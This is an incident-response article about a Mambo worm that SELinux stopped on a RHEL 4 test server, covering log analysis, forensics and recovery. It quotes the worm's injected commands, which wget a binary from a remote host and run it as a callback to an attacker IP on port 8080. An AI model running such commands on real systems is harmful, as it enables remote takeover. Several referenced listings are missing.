If you operate Internet-connected servers, chances are you 
eventually will have to deal with a successful attack. Last year,
I discovered that despite the multilayered defenses in place on a test
Web server (targetbox), an attacker had managed to use an exploit in a
partially successful attempt to gain access. This server was running
Red Hat Enterprise Linux 4 (RHEL 4) and the Mambo content management
system. It had multiple defenses in place, including Security-Enhanced
Linux (SELinux). SELinux prevented the attacker from executing the second
stage of the attack, possibly preventing a root compromise.
</p><p>
This article presents a case study of the intrusion response,
explaining how I discovered the intrusion, what steps I took to identify
the exploit, how I recovered from the attack and what lessons I learned
regarding system security. I've changed machine names and IP addresses
for privacy reasons.
</p><p>
Computers involved in the attack:
</p><div class="itemizedlist"><ul type="disc"><li><p>
targetbox: 192.168.166.155&mdash;our server, running RHEL 4 and Mambo.

Defending Your System from Attack</h2></div></div><p>
Today, prudent system administrators defend their machines with a layered
security approach, using firewalls, automated patch management systems, log
analysis tools and, recently, SELinux. SELinux
provides additional access controls beyond those traditionally provided in
the UNIX security model. Recent Red Hat Enterprise Linux and Fedora Core
releases have an SELinux policy implementation called the targeted
policy. It aims to restrict the privileges of programs in multiple
packages to the minimum that they require for correct operation. This
can blunt an attack that depends on having read, write or execute access
to certain files or directories.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107e978"></a>
Discovering the Incident</h2></div></div><p>
At approximately 8:00 AM on Saturday, May 6, 2006, I was auditing the
logs on targetbox when I noticed an odd SELinux enforcement message
in /var/log/messages:


<pre     class="programlisting">
May  4 07:52:27 targetbox kernel: audit(1146743547.060:2277): 
avc:  denied  { execute_no_trans } for  pid=9401 comm="sh" 
name="cback" dev=dm-0 ino=852100 
scontext=user_u:system_r:httpd_sys_script_t 
tcontext=user_u:object_r:httpd_sys_script_rw_t tclass=file
</pre>
</p><p>
I used locate to try to identify cback quickly:

<pre     class="programlisting">
# locate cback
/tmp/cback
/usr/share/pixmaps/gnome-ccbackground.png
/usr/lib/libartscbackend.la
/usr/lib/libartscbackend.so.0.0.0
/usr/lib/libartscbackend.so.0
</pre>
</p><p>
The file command revealed the executable file type of cback:

<pre     class="programlisting">
# file /tmp/cback
/tmp/cback: ELF 32-bit LSB executable, Intel 80386, 
version 1 (SYSV), for GNU/Linux 2.2.0, dynamically 
linked (uses shared libs), not stripped
</pre>
</p><p>
The user apache owned that file, but it had a date a few months before
the initial operating system installation on targetbox:

<pre     class="programlisting">
# ls -i /tmp/cback
852100 /tmp/cback
[root@targetbox ~]# ls -lZ /tmp/cback
-rwxr--r--  apache   apache   
user_u:object_r:httpd_sys_script_rw_t /tmp/cback
[root@targetbox ~]# ls -lai /tmp/cback 
852100 -rwxr--r--  1 apache apache 13901 
Feb 15  2005 /tmp/cback
</pre>
</p><p>
This confirmed the identity of cback as the file in the audit message,
because it had the inode number 852100.
</p><p>
If locate had not found the file, I could have used find to try to
identify the file by inode:

<pre     class="programlisting">
# find / -inum 852100 2&gt;/dev/null
/tmp/cback
</pre>
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107ee48"></a>
Analyzing the Executable for Clues</h2></div></div><p>
Given the name of the script, maybe it was intended as a callback program.
Because the apache user owned the file, I checked the Web server log files
for evidence.
</p><p>
Because the attack program was in /tmp, I saved a copy of it for posterity:

<pre     class="programlisting">
# cp -a cback /root
</pre>
</p><p>
The attack program seemed to do something with sockets, judging from
the strings within (Listing 1).

The Web server log file had many suspicious requests, some attacking Mambo
using command injection and wget, some attacking other CMS systems. I
copied all the lines containing php or wget using grep and put them in
/root/exploit.log. Listing 2 contains a trace of the most recent attempt.

The log file did contain two very useful clues; it confirmed that
the cback binary was related to a request made to Mambo. Furthermore,
the query string confirmed that the attacker used wget, a command-line
URL-fetching tool, to retrieve the exploit from a remote server. The
Web server request attempted to execute the cback executable with an
IP address parameter of 10.200.238.39, presumably another machine under
the control of the attacker.
</p><p>
The attack attempted to execute this sequence of shell commands:

<pre     class="programlisting">
cd /tmp
wget 172.16.31.57/cback
chmod 744 cback
./cback 10.200.238.39 8080
echo YYY
echo| HTTP/1.1
</pre>
</p><p>
Going back to /var/log/messages, I searched for further suspicious
SELinux enforcement messages. Listing 3 contains the lines that matched
the times of the Web server attacks.

Lines showing further attacks similar to the trace on stockpot versus
Mambo, xmlrpc.php, drupal and phpgroupware also appeared in this grep.
</p><p>
The worm made requests only to the default virtual host, so it's
likely that the worm was not using the Host: virtual host header in its
requests. This indicates that it was scanning IP subnets for vulnerable
hosts, rather than working through a list of hostnames.
</p><p>
The modification time on the cback file was Feb 5, 2005. That was
probably the modification time of the file on the remote system that
wget retrieved. wget normally resets the modification time of files it
downloads to match their original modification times. Listing 5 shows
how to interrogate all the timestamps on a file.

The cback binary probably was created at 07:52 AM on May 4, corresponding
to the wget command injection attack. That was the last time the
file attributes were modified. Although UNIX does not allow you to retrieve
the true creation time of a file, the status time often can stand in
for that. The other times correspond to the times of my own initial
investigations of the cback file. If I had been more careful, I could have
done this ls command before reading the cback file at all, so that the
atime, access and use times would have been those the attacker had set.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076758"></a>
What Hit Me?</h2></div></div><p>
Because this looked like a worm attacking Mambo, a search on &ldquo;mambo
worm&rdquo;
on Google found references to the attack, including articles from
<span   class="emphasis"><em>ComputerWorld</em></span>, <span   class="emphasis"><em>Outpost24</em></span>,
F-Secure and Bugtraq (see Resources).
</p><p>
The Mitre Common Vulnerabilities and Exposures Project provides a
dictionary of known vulnerabilities. It has a brief abstract of the
characteristics of the vulnerability with references to security mailing
lists and Web sites that confirm the problems. Searching for
&ldquo;mambo&rdquo;
on <a href="http://www.cvw.mitre.org" target="_self">www.cvw.mitre.org</a> yielded a couple-dozen known
vulnerabilities&mdash;one
of which (CVS-2005-3738) relates to mosConfig_absolute_path, one of the
seriously mangled variables in the request URL.
</p><p>
After reading up on recent malware activity surrounding Mambo, I
saw that the attack vector probably was closely related to the
Net-Worm.Linux.Mare.d worm strain described in the news reports and
vulnerability databases. However, some of the names of executables in
the attack that hit targetbox were slightly different from the attack
executables named in the vulnerability reports.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076ac8"></a>
Safety Precautions and Forensic Evidence</h2></div></div><p>
To run these security analysis tools in the safest way possible, you need
to disconnect the computer in question from all networks and boot from
known good media before attempting to analyze the intrusion. That way,
any remaining attack programs will not be able to attack other machines
on your network, and intruders will not interrupt your investigation
by interacting with the machine. You won't be able to use the system
while you analyze the intrusion, and it may take time to put together
an analysis toolkit that will work on a rescue disk. Although this takes
more time and preparation than running the analysis tools on a running
system that might be compromised, it gives a higher level of assurance
that a compromise will not spread to other machines on your network.
</p><p>
Making a backup copy of the entire disk to a removable drive also
is a good idea. You could use a command such as this to do the job:

<pre     class="programlisting">
# dd if=/dev/hda1 of=/mnt/removable-drive/disk.img bs=512k
</pre>
</p><p>
You then can mount and analyze the backup using the loop device (see
&ldquo;Disk Images under Linux&rdquo; in the Resources section). It's probably faster
and easier to analyze the original system, but it's nice to have this
backup for forensic purposes.
</p><p>
In an ideal world, you could do this the moment you realize an attack
has succeeded. However, sometimes you have to assess the severity of
the compromise and balance that against the time and resources you
have available.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076d88"></a>
Figuring Out the Damage Done</h2></div></div><p>
It looks like whoever broke in could have read or written to any file
available to the apache user. This would include the PHP configuration
file for Mambo that had a MySQL database user name and password in it. I
changed that password just to be sure that the intruder could not use
it to attempt further privilege escalation.
</p><p>
Fortunately for me, this was only a test installation, so to prevent
future exploits, I removed the Mambo installation completely. I also could
have attempted to upgrade the software to remove the vulnerability.
</p><p>
When a user account is compromised, you need to face the danger that
the attacker could gain access to the superuser (root) account. If
an attacker gets root, it can make it much more difficult to recover from an
attack. Most of the time, you need to re-install the operating system
from known good media and carefully and selectively audit and restore
software configurations. Attackers who manage to get root access often
install a rootkit&mdash;software that hides itself from casual inspection and
offers a remote control back door or other malicious features. Fortunately,
a program called chkrootkit (from <a href="http://chkrootkit.org" target="_self">chkrootkit.org</a>) can help scan for active
rootkits. Listing 6 shows the output of chkrootkit in quiet mode on
targetbox.

INFECTED (PORTS:  465)
</pre></div><p>
The chkrootkit program checks for and analyzes various files that rootkits and worms commonly leave behind. It warns about hidden files in
unexpected places and services running on ports that malware often
uses. A quick inspection revealed that the hidden files this listed
were all harmless. The INFECTED warning on port 465 was a false alarm,
because this computer was running a Web server that listens for https on
port 465. In this case, analyzing the chkrootkit output did not reveal
a real rootkit problem. Running chkrootkit can give you some extra
peace of mind when you know an attacker has penetrated your defenses,
even though its checks are not conclusive.

The Good News</h2></div></div><p>
The server ran SELinux using the targeted policy at the time of the
attack. The audit log message that originally sounded the alarm that
all was not well was an access denied message. The Web server error log
provided more detail in the form of the output of the injected shell code,

SELinux prevented the cback executable from running, saving targetbox
from the next stage of the worm.
</p><p>
Newer versions of Mambo close the hole that the attacker exploited, so I
could install a new version without being vulnerable to the same exploit.

Lessons Learned</h2></div></div><p>
Many of the tools required to analyze an attack are already a core part
of all modern Linux distributions. Combined with the power of modern
search engines and the public disclosure of known vulnerabilities, you can
often determine a good deal of information about the nature of an attack.
</p><p>
Installing something from source code to test it out, then leaving it
on a publicly available computer made the system vulnerable.
That this test installation lived in the document root of the main
virtual host on the Web server made it even more exposed and vulnerable
to discovery by worms.
</p><p>
Many PHP-powered systems have installation instructions that essentially
tell you to unarchive the software somewhere inside the document root of a
Web server, then modify some configuration files. You often cannot use
the same type of clean operating-system-wide packaging for PHP systems,
as each installation uses a distinct set of PHP templates. It took
about 11 months between installing Mambo and the attack, during which
time I did not update the software at all.
</p><p>
Using yum or apt-get to update Mambo would help keep
it up to date. When I started investigating Mambo, I could not find
RPM packaging for it, though third parties have created RPMs for Mambo
since then. Operating system vendors and software authors need to work
on better mechanisms for automatic software maintenance of Web systems.
</p><p>
SELinux really saved the day, preventing the exploit program from
running. Without the protection of SELinux, this easily could have
turned into a root compromise requiring a much more extensive analysis
and recovery effort.
